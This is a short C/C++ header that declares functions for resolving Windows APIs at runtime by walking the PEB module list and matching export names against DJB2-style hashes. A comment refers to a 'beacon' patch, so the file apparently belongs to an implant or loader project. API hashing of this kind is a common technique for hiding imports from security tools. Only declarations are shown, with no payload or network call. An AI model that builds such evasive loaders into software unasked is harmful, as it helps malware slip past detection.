#pragma once
/*
 * Dynamic API resolution (PEB module walk + export table scan).
 * Uses DJB2-style hashing (seed 1572, lowercase ASCII) — see Djb2A/Djb2W in ProcLoader.cpp.
 * Precomputed hashes live in ApiDefines.h (HASH_LIB_*, HASH_FUNC_*).
 * Note: beacon_c_patch uses a different hash (ROR11 + 0x55555555); values are not interchangeable.
 */
#include <windows.h>
#include "ApiDefines.h"

ULONG Djb2A(PUCHAR str);

ULONG Djb2W(PWCHAR str);

HMODULE GetModuleAddress(ULONG modHash);

LPVOID GetSymbolAddress(HANDLE hModule, ULONG symbHash);